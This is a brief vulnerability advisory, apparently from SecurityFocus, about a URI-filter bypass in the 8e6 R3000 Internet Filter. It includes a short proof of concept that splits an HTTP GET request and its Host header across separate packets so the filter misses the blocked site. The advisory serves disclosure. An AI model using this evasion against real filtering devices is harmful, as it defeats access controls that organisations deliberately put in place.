source: https://www.securityfocus.com/bid/27309/info

8e6 R3000 Internet Filter is prone to a vulnerability that allows attackers to bypass URI filters.

Attackers can exploit this issue by sending specially crafted HTTP request packets for an arbitrary website. Successful exploits allow attackers to view sites that the device is meant to block access to. This could aid in further attacks.

R3000 Internet Filter 2.0.05.33 is vulnerable; other versions may also be affected. 

packet 1: GE
packet 2: T / HTTP/1.0\r\n




packet 1: GET / HTTP/1.0
X-SomeHeader: ...
....

packet 2: X-SomeOtherHeader: ....
Host: www.example.com
...